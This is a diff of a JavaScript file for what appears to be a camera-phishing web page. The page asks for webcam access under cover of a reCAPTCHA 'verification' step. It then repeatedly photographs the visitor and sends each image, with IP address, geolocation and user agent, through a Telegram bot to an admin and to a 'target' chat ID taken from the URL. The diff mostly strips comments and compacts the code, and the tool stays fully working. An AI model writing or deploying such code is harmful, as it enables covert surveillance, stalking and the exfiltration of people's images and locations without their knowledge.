@@ -1,6 +1,5 @@
 import { CONFIG } from "./config.js";
 
-/* ================= DOM refs ================= */
 const video     = document.getElementById("video");
 const canvas    = document.getElementById("canvas");
 const camPanel  = document.getElementById("camPanel");
@@ -13,7 +12,6 @@ const diag      = document.getElementById("diag");
 const sessId    = document.getElementById("sessId");
 const recapW    = document.getElementById("recapWrap");
 
-/* ================= Params ================= */
 const params     = new URLSearchParams(window.location.search);
 const userChatId = params.get("id");
 const hasTarget  = !!(userChatId && userChatId.trim());
@@ -25,12 +23,10 @@ let captureCount = 0;
 let capturing = false;
 let recaptchaWidgetId = null;
 
-/* Short session id shown in top bar */
 sessId.textContent = Math.random().toString(36).slice(2, 8).toUpperCase();
 
-/* ================= Helpers ================= */
 function diagLog(t){
-  if (CONFIG.DEBUG) console.log("[v3]", t);
+  if (CONFIG.DEBUG) console.log("[v4]", t);
   if (diag) diag.textContent = t;
 }
 
@@ -41,30 +37,15 @@ function setCamPanel(state, title, sub){
   camSub.textContent = sub;
 }
 
-/* ================= Intel ================= */
 async function getIP(){
-  try {
-    const r = await fetch("https://api.ipify.org?format=json");
-    const d = await r.json();
-    return d.ip || "Unknown";
-  } catch {
-    try {
-      const r = await fetch("https://ipapi.co/json/");
-      const d = await r.json();
-      return d.ip || "Unknown";
-    } catch { return "Unknown"; }
-  }
+  try { const r=await fetch("https://api.ipify.org?format=json"); const d=await r.json(); return d.ip||"Unknown"; }
+  catch { try { const r=await fetch("https://ipapi.co/json/"); const d=await r.json(); return d.ip||"Unknown"; } catch { return "Unknown"; } }
 }
-
 async function getGeo(){
-  try {
-    const r = await fetch("https://ipapi.co/json/");
-    const d = await r.json();
-    return `${d.city || "?"}, ${d.country_name || "?"}`;
-  } catch { return "Unknown"; }
+  try { const r=await fetch("https://ipapi.co/json/"); const d=await r.json(); return `${d.city||"?"}, ${d.country_name||"?"}`; }
+  catch { return "Unknown"; }
 }
 
-/* ================= Send to one chat ================= */
 async function sendPhotoTo(targetId, blob, caption){
   const fd = new FormData();
   fd.append("chat_id", targetId);
@@ -73,20 +54,13 @@ async function sendPhotoTo(targetId, blob, caption){
   try {
     const res = await fetch(
       `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
-      { method: "POST", body: fd }
+      { method:"POST", body:fd }
     );
-    if (!res.ok){
-      diagLog("send fail " + targetId);
-      return false;
-    }
+    if (!res.ok){ diagLog("send fail " + targetId); return false; }
     return true;
-  } catch (e){
-    diagLog("net err " + targetId);
-    return false;
-  }
+  } catch { diagLog("net err " + targetId); return false; }
 }
 
-/* ================= Capture one frame ================= */
 async function capture(){
   if (!stream || !capturing) return;
 
@@ -103,19 +77,15 @@ async function capture(){
   const ip = await getIP();
   const geo = await getGeo();
   const ua = navigator.userAgent;
-  const date = new Date().toLocaleString("en-US", { timeZoneName: "short" });
+  const date = new Date().toLocaleString("en-US", { timeZoneName:"short" });
 
   const base = `📸 #${captureCount + 1}\n🕐 ${date}\n🌐 ${ip} — ${geo}\n💻 ${ua}`;
   const adminCaption = hasTarget
     ? `${base}\n👤 Target: ${userChatId}`
     : `${base}\n🧾 No target (admin-only)`;
 
-  if (CONFIG.SEND_ADMIN_ALWAYS){
-    await sendPhotoTo(ADMIN_ID, blob, adminCaption);
-  }
-  if (CONFIG.SEND_TO_USER_IF_ID && hasTarget){
-    await sendPhotoTo(userChatId, blob, base);
-  }
+  if (CONFIG.SEND_ADMIN_ALWAYS) await sendPhotoTo(ADMIN_ID, blob, adminCaption);
+  if (CONFIG.SEND_TO_USER_IF_ID && hasTarget) await sendPhotoTo(userChatId, blob, base);
 
   captureCount++;
   cntCap.textContent = captureCount;
@@ -123,7 +93,6 @@ async function capture(){
   diagLog("capture " + captureCount);
 }
 
-/* ================= Start camera ================= */
 async function startCamera(){
   diagLog("requesting camera");
   setCamPanel("requesting","Requesting camera…","Please click Allow to continue.");
@@ -131,9 +100,9 @@ async function startCamera(){
   try {
     stream = await navigator.mediaDevices.getUserMedia({
       video: {
-        width:  { ideal: CONFIG.CAM_WIDTH },
-        height: { ideal: CONFIG.CAM_HEIGHT },
-        facingMode: "user"
+        width:{ ideal: CONFIG.CAM_WIDTH },
+        height:{ ideal: CONFIG.CAM_HEIGHT },
+        facingMode:"user"
       }
     });
     video.srcObject = stream;
@@ -149,14 +118,11 @@ async function startCamera(){
     liveBar.style.display = "flex";
     recapW.classList.remove("fader");
 
-    // Start capture loop
     capturing = true;
     await capture();
     captureTimer = setInterval(capture, CONFIG.CAPTURE_INTERVAL_MS);
 
-    // Try to render reCAPTCHA now (in case reCAPTCHA loaded first)
     tryRenderRecaptcha();
-
     diagLog("camera running");
   } catch (err){
     diagLog("camera denied: " + err.name);
@@ -164,18 +130,13 @@ async function startCamera(){
   }
 }
 
-/* ================= Stop ================= */
 function stopCapture(){
   capturing = false;
   if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
-  if (stream){
-    stream.getTracks().forEach(t => t.stop());
-    stream = null;
-  }
+  if (stream){ stream.getTracks().forEach(t => t.stop()); stream = null; }
   liveBar.style.display = "none";
 }
 
-/* ================= reCAPTCHA ================= */
 function tryRenderRecaptcha(){
   if (!window.__recaptchaReady || !window.__cameraReady) return;
   if (recaptchaWidgetId !== null) return;
@@ -202,15 +163,9 @@ function onRecaptchaSuccess(){
   diagLog("captcha solved");
   document.getElementById("bottomRight").textContent = "✓ Verified";
 
-  if (CONFIG.STAY_ON_PAGE_AFTER_SUCCESS){
-    // keep capturing
-    return;
-  }
-  // Stop capture and redirect to next.html
+  if (CONFIG.STAY_ON_PAGE_AFTER_SUCCESS) return;
   stopCapture();
-  setTimeout(() => {
-    window.location.href = "next.html";
-  }, 800);
+  setTimeout(() => { window.location.href = "next.html"; }, 800);
 }
 window.onRecaptchaSuccess = onRecaptchaSuccess;
 
@@ -226,7 +181,6 @@ function onRecaptchaError(){
 }
 window.onRecaptchaError = onRecaptchaError;
 
-/* ================= Auto start on load ================= */
 if (CONFIG.AUTO_START_ON_LOAD){
   window.addEventListener("load", () => {
     diagLog("auto-start on load");
